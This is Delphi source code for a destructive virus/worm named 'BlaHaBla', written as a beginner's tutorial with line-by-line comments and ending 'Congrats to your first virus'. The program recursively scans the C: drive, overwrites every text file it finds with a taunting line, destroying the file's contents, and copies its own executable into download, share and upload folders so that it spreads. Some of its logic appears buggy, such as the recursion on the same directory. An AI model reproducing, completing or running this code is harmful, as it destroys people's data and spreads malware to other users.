   (* BlaHaBla virus Coded by p0ke *)
   { -- http://p0ke.no-ip.com -- }
   {-BlaHaBla-}

   program BlaHaBla;        {Program Name}

   uses                     {Libraries to Use}
     Windows,               {Windows: Alot of declares shit we need}
     SysUtils;              {Sysutils: Takes bout 40 kb and contains alot of functions.}

   {








     If you want to lower your program size
     remove "Sysutils" from Uses and uncomment
     following text:








   }
   (*


   Const
     faDirectory                         = $00000010;
     faHidden                            = $00000002;
     faSysFile                           = $00000004;
     faVolumeID                          = $00000008;

   Type
       TFileName = type string;
       TSearchRec = record
         Time: Integer;
         Size: Integer;
         Attr: Integer;
         Name: TFileName;
         ExcludeAttr: Integer;
         FindHandle: THandle;
         FindData: TWin32FindData;
       end;

       LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
       end;


   function ExtractFileExt(Name: String): String;
   Begin
     If Pos('.', Name) = 0 Then Exit;

     While Pos('.', Name) > 0 Do
       Name := Copy(Name, Pos('.', Name)+1, Length(Name));

     Result := Name;
   End;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Function ExtractFileName(St:String):String;
   Var
     Str:String;
   Begin
     Str := St;
     Repeat
       If Pos('\', Str) > 0 Then
       Begin
         Str := Copy(Str, Pos('\', Str)+1, Length(Str));
       End;
     Until Pos('\', Str) = 0;
     Result := Str;
   End;

   Function ExtractFilePath(St:String):String;
   Var
     Str:String;
   Begin
     Str := St;
     Result := '';
     Repeat
       If Pos('\', Str) > 0 Then
       Begin
         Str := Copy(Str, Pos('\', Str)+1, Length(Str));
         Result := Result + Copy(Str, 1, Pos('\', Str));
       End;
     Until Pos('\', Str) = 0;
   End;

   // FindMatchingFile Function
   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   // FindClose Function
   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   // FindFirst Function
   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   // FindNext Function
   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   *)

   Procedure WriteFile(FileName: String);        {This procedure rewrites a choosen textfile}
   Var
     F: TextFile;                                {F is declared as TextFile (can now handle files input/output)}
   Begin
     AssignFile(F, FileName);                    {First assign (open file)}
     Rewrite(F);                                 {Then choose Rewrite to rewrite it}
     WriteLn(F, 'BlaHaBla was here Bitch');      {Write line to F (the file)}
     CloseFile(F);                               {Close the file. We are done :)}
   End;

                            {SearchFile is a procedure to search the whole directory :)}
   procedure SearchFiles(d: string);
   var
     sr: TSearchRec;        {TSearchRec is what we uses when searching for files.}

     Path, Filename, FileExt: String;
     {Path is used for getting found file-paths}
     {Filename is used for getting found file-names}
     {FileExt is used for getting found file-extensions (such as exe, txt)}

   begin
     If D[Length(D)] <> '\' Then D := D + '\';  {If D aint ending with "\" then we add "\" to the end.}
     If FindFirst(D, faDirectory, Sr) = 0 Then  {Now, If findfirst equals 0, then it found something.}
     Repeat                                     {We repeat the procedure until there is nothing more to find.}
       If ((Sr.Attr And faDirectory) = faDirectory) Then  {If we found a Directory (saDirectory) then ...}
         SearchFiles(D)                                   {Then we scan the directory using this function}
       Else Begin                                         {Else if its not a directory but a file}
                            {lets see what file it is, where it is.}
         Path := ExtractFilePath(Sr.Name);                {Extracts the filepath}
         Filename := ExtractFileName(Sr.Name);            {Extracts the filename}
         FileExt := ExtractFileExt(Sr.Name);              {Extracts the fileextension}

         {Now we got path, name and extension.}

         {LowerCase changes the text to LowerCase}
         If LowerCase(FileExt) = 'txt' Then
         Begin
           {We found a TextFile. Lets ReWrite it}
           WriteFile(Path + FileName);
         End;

         {Lets see if the directory contains download/share/upload. If so, we can copy ourself there.}

         {Download First}
         If Pos('download', lowercase(Path)) > 0 Then  {If pos() is larger then 0, then its in the filepath string.}
         Begin
           CopyFile( pChar( paramStr(0) ), pChar( Path + 'filename.exe' ), False);
           {CopyFile(pchar(from), pchar(to), CancelIfExists)}
           { ParamStr(0) is THIS file. The Virus. }
           {We copy ourself, to the directory as "Filename.exe"}
         End;

         {Share Second}
         If Pos('share', lowercase(Path)) > 0 Then
         Begin
           CopyFile( pChar( paramStr(0) ), pChar( Path + 'filename.exe' ), False);
         End;

         {Upload Last}
         If Pos('upload', lowercase(Path)) > 0 Then
         Begin
           CopyFile( pChar( paramStr(0) ), pChar( Path + 'filename.exe' ), False);
         End;

       End;
     Until FindNext(Sr) <> 0;                             {Repeat until FindNext(SR) is anything but 0. (means no more files)}
     FindClose(Sr);                             {FindClose, else error :)}

     {
       If the procedure reaches here, it exits. Meaning it cant find more files on the system.
     }
   end;

   begin
     { To start this worm, we need 1 single call :) }
     SearchFiles('C:\');
     {There done. Now it will scan the whole computer
      overwriting txtfiles, and copy to shared directories.}

     {

       Congrats to your first virus

     }
   end.
